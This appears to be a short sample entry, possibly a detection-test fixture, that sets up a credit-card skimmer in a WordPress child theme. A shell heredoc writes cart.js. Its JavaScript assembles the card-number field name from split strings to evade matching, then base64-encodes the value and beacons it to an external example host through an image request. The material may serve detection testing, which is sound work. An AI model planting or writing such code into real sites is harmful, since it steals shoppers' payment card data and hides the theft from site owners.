# category: web
# title: Card skimmer in a theme with the field's name split into pieces
# indicator: wp-content/themes/shop-child/js/cart.js
mkdir -p /var/www/wp/wp-content/themes/shop-child/js
cat >/var/www/wp/wp-content/themes/shop-child/js/cart.js <<'JS'
document.addEventListener("change",function(){var c=document.querySelector('[name="'+'payment[cc'+'_num'+'ber]'+'"]');if(c&&c.value.length>15){new Image().src="https://cdn-metrics.example.com/p.gif?d="+btoa(c.value)}});
JS
chown -R www-data:www-data /var/www/wp/wp-content/themes
